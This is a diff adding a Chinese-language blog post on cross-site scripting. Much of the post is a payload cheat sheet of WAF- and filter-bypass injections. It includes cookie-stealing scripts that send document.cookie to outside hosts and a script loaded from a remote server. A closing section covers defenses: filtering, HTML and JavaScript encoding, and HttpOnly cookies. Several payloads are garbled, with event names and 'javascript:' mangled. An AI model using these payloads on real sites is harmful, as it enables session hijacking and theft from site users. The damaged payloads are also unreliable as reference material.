@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>xss | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 持续更新中</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/dongyuanxin/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-01-01
+    </span>
+    
+      <span>
+        | <a href="/categories/web/"><i class="fa fa-bookmark"></i>web</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    xss
+  </h1>
+  
+  <article class="passage-article">
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> xss</span><br><span class="line"></span><br><span class="line">XSS 漏洞简介</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</span><br><span class="line">xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。</span><br><span class="line">常见的输出函数有： echo printf print print_r sprintf die var-dump var_export.</span><br><span class="line">xss 分类：（三类）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反射型: 非持久性XSS攻击，当用户访问已被插入攻击代码的链接时，攻击代码执行，完成该次攻击。</span><br><span class="line">存储型：持久型XSS攻击，攻击者把攻击代码永久存储在目标服务器上中，例如数据库，消息论坛，留言板，访问者日志等。当用户进入页面，代码就会被执行。</span><br><span class="line">DOM 型：DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应</span><br><span class="line"></span><br><span class="line"> 反射型的XSS漏洞</span><br><span class="line"></span><br><span class="line"> &lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;,点击确定</span><br><span class="line">这时说明这个网站可以进行XSS攻击，我们输入 &lt;script&gt;document.location=&apos;http://127.0.0.1/cookie.php?cookie=&apos;+document.cookie&lt;/script&gt; ，就可以得到要攻击的人cookie信息。</span><br><span class="line"></span><br><span class="line">存储型XSS漏洞</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Message处尝试输入&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class="line">这时我们采取新办法，我们在name中输入 &lt;img src=x onerror=alert(&apos;xss&apos;)&gt;</span><br><span class="line">发现成功绕过</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Xss绕waf</span><br><span class="line">1、 最简单最常用的测试代码：</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(“xss”)&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">输入框或者url参数。</span><br><span class="line">2、 闭合前面的标签：&lt;input type=”text” value=””&gt;</span><br><span class="line">“&gt;&lt;script&gt;alert(“xss”)&lt;/script&gt;&lt;a=”</span><br><span class="line">3、 绕过引号过滤，过滤机制检测我们的输入一旦检测到单引号就加上\转义字符</span><br><span class="line">使用html字符实体，如$#34;和&amp;quot;均表示双引号&amp;quot;&gt;&lt;script&gt;alert(&amp;quot;xss&amp;quot;)&lt;/script&gt;</span><br><span class="line">4、 使用javascript中的fromCharCode函数，用于将ascii转化成字符</span><br><span class="line">&lt;script&gt;String.fromCharCode(97,108,101,114,116)(String.fromCharCode(88,83,83))&lt;/script&gt;</span><br><span class="line">5、 &lt;ScRiPt. alert(“xss”);&lt;/ScRiPt&gt;</span><br><span class="line">6、 &lt;Scriscriptpt&gt;alert(“xss”);&lt;scriScriptpt&gt; 过滤时使用递归算法才能彻底过滤这种情况</span><br><span class="line">不使用script标签</span><br><span class="line">7、 我们可以使用&lt;body nload=”alert(‘xss’)”&gt;</span><br><span class="line">8、 &lt;img src=a nerror=”javascript.:alert(‘xss’)”&gt;</span><br><span class="line">9、 &lt;input type=”text” name=”username” nclick=”javascript.:alert(‘xss’)”&gt;</span><br><span class="line">             onActivate与onfocus事件：</span><br><span class="line">&lt;input type=”text” name=”username” nActivate=”javascript.:alert(‘xss’)”&gt;</span><br><span class="line">&lt;input type=”text” name=”username” nfocus=”javascript.:alert(‘xss’)”&gt;</span><br><span class="line">&lt;img&gt;标签</span><br><span class="line">             标准例子：&lt;img src=”javascript.:alert(‘xss’);”&gt;还有一些变形</span><br><span class="line">             &lt;img src=javascript.:alert(‘xss’)&gt;</span><br><span class="line">             &lt;img src=javascript.:alert(&amp;quot;xss&amp;quot;)&gt;</span><br><span class="line">            &lt;img src=javascript.:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">             或者全部转化为ascii码：&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101; &amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</span><br><span class="line">             还可以转化成16进制，</span><br><span class="line">&lt;img src=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp; #x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x58;&amp;#x53;&amp;#x53;&amp;#x27;&amp;#x29;&gt;</span><br><span class="line">制表符、换行符、回车</span><br><span class="line">             &lt;img src=&quot;jav   ascript.:alert(&apos;XSS&apos;);&quot;&gt; 加入空格</span><br><span class="line">             &lt;img src=”jav&amp;#x9ascript.:alert(‘xss’);”&gt;</span><br><span class="line">            &lt;img src=”jav&amp;#xAascript.:alert(‘xss’);”&gt;</span><br><span class="line">             &lt;img src=”jav&amp;#13ascript.:alert(‘xss’);”&gt;</span><br><span class="line">            空字符，有的过滤器认为空字符就代表着字符串的结束</span><br><span class="line">&lt;scri%00pt&gt;alert(‘xss’);&lt;/script&gt; (IE6、IE7)</span><br><span class="line">             双引号配对</span><br><span class="line">&lt;img &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;，浏览器会解析成&lt;img&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&amp;gt;</span><br><span class="line">             &lt;SCRIPT. &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://yoursite.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;也可以换用&lt;，或者混合使用</span><br><span class="line">             转义字符的使用，&lt;img src=’javascript.:alert(\”xss\”)’&gt;，如果过滤器遇到双引号就转义，我们的\可以绕过该过滤方法。</span><br><span class="line">        通过css插入</span><br><span class="line">             &lt;link rel=”stylesheet” herf=”javascript.:alert(‘xss’);”&gt; (IE6、opera)</span><br><span class="line">            &lt;style. a &#123; width: expression(alert(‘xss’)) &#125;&lt;/style&gt;</span><br><span class="line">             &lt;div style=”width: expression(alert(‘xss’));”&gt;</span><br><span class="line">             &lt;STYLE&gt;@import&apos;http://yoursite.com/xss.css&apos;;&lt;/STYLE&gt;</span><br><span class="line">             &lt;img style=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">             利用iframe. &lt;iframe. SRC=&quot;javascript.:alert(&apos;XSS&apos;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">             &lt;FRAMESET&gt;&lt;FRAME. SRC=&quot;javascript.:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;</span><br><span class="line">             table标签&lt;TABLE BACKGROUND=&quot;javascript.:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">             &lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript.:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">             &lt;SCRIPT. SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt; xss.jpg实际上是一个js文件</span><br><span class="line">    &lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://yoursite.com/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">             &lt;script. src=http://yoursite.com/xss.js?&lt;B&gt; 浏览器会自己纠正我们的语法错误</span><br><span class="line">             &lt;BASE HREF=&quot;javascript.:alert(&apos;XSS&apos;);//&quot;&gt;利用base标签</span><br><span class="line">             &lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://yoursite.com/xss.html&quot;&gt;&lt;/OBJECT&gt;利用object标签。</span><br><span class="line">             &lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;利用embed标签，可以插入代码恶意代码的flash文件。</span><br><span class="line">            &lt;META. HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript.:alert(‘XSS’);”&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">测试漏洞，重定向</span><br><span class="line">输入 &lt;script&gt;window.location=&apos;https://www.baidu.com&apos;&lt;/script&gt;</span><br><span class="line"> &lt;script&gt;new Image().src=&quot;http://192.168.47.138/d.php?output=&quot;+document.cookie;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=http://192.168.47.138/a.js&gt;&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">var img = new Image();</span><br><span class="line">img.src = &quot;http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie;</span><br><span class="line"></span><br><span class="line">XSS防御</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">从上面的介绍可知，XSS 漏洞是由于对用户提交的数据没有经过严格的过滤处理造成的，所以防御的原则就是不相信用户输入的数据，对输入进行过滤，对输出进行编码。</span><br><span class="line"></span><br><span class="line">1、使用 XSS Filter</span><br><span class="line"></span><br><span class="line">针对用户提交的数据进行有效的验证，只接受我们规定的长度或内容的提交，过滤掉其他的输入内容。比如：</span><br><span class="line"></span><br><span class="line">    表单数据指定值的类型：年龄只能是 int 、name 只能是字母数字等。</span><br><span class="line"></span><br><span class="line">    过滤或移除特殊的 html 标签：&lt;script&gt;、&lt;iframe&gt;等。</span><br><span class="line"></span><br><span class="line">    过滤 js 事件的标签：onclick、onerror、onfocus等。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2、html 实体</span><br><span class="line"></span><br><span class="line">当需要往 HTML 标签之间插入不可信数据的时候，首先要做的就是对不可信数据进行 HTML Entity 编码，在 html 中有些字符对于 HTML 来说是具有特殊意义的，所以这些特殊字符不允许在文本中直接使用，需要使用实体字符。 html 实体的存在是导致 XSS 漏洞的主要愿意之一，因此我们需要将实体转化为相应的实体编号。</span><br><span class="line">显示结果	描述	实体编号</span><br><span class="line">  	空格 	&amp;nbsp ;</span><br><span class="line">&lt; 	小于 	&amp;lt ;</span><br><span class="line">&gt; 	大于 	&amp;gt ;</span><br><span class="line">&amp; 	和 	&amp;amp ;</span><br><span class="line">&apos;&apos; 	引号 	&amp;quot ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、JavaScript编码</span><br><span class="line"></span><br><span class="line">这条原则主要针对动态生成的JavaScript代码，这包括脚本部分以及HTML标签的事件处理属性（如onerror, onload等）。在往JavaScript代码里插入数据的时候，只有一种情况是安全的，那就是对不可信数据进行JavaScript编码，并且只把这些数据放到使用引号包围起来的值部分（data value）之中，除了上面的那些转义之外，还要附加上下面的转义： </span><br><span class="line">\ 转成 \\</span><br><span class="line"></span><br><span class="line">/ 转成 \/</span><br><span class="line"></span><br><span class="line">; 转成 ；(全角;)</span><br><span class="line"></span><br><span class="line">注意：在对不可信数据做编码的时候，不能图方便使用反斜杠\ 对特殊字符进行简单转义，比如将双引号 ”转义成 \”，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击；另外，输出的变量的时候，变量值必须在引号内部，避免安全问题；更加严格的方式，对除了数字和字母以外的所有字符，使用十六进制\xhh 的方式进行编码。</span><br><span class="line"></span><br><span class="line">4、Http Only cookie</span><br><span class="line"></span><br><span class="line">许多 XSS 攻击的目的就是为了获取用户的 cookie，将重要的 cookie 标记为 http only，这样的话当浏览器向服务端发起请求时就会带上 cookie 字段，但是在脚本中却不能访问 cookie，这样就避免了 XSS 攻击利用 js 的 document.cookie获取 cookie。</span><br></pre></td></tr></table></figure>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2019/01/01/web/xss/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2019/01/01/逻辑/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2019/01/01/Meterpreter/Mestasploit 后渗透/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
